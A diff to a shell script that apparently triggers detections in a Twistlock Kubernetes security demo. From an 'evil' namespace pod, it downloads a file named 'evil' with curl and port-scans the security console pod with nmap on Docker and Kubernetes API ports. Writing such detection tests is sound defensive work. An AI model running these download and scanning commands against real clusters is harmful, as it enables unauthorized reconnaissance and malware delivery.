@@ -1,7 +1,11 @@
 PO=$(kubectl get po -n evil|grep evil| awk '{ print $1 }')
+Target=$(kubectl get po -n twistlock|grep console| awk '{ print $1 }')
 
 echo "Pod name is":
 echo $PO
+
+echo "Target is:"
+echo $Target
 
 echo "DL bad evil file"
 kubectl exec $PO -n evil -- bash -c "curl https://cdn.twistlock.com/john/evil -o evil"
@@ -14,4 +18,4 @@ echo "bad domain"
 kubectl exec $PO -n evil -- bash -c "curl github.com"
 
 echo "bad port scanning"
-kubectl exec $PO -n evil -- bash -c "nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 10.32.0.24"
+kubectl exec $PO -n evil -- bash -c "nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 $Target"
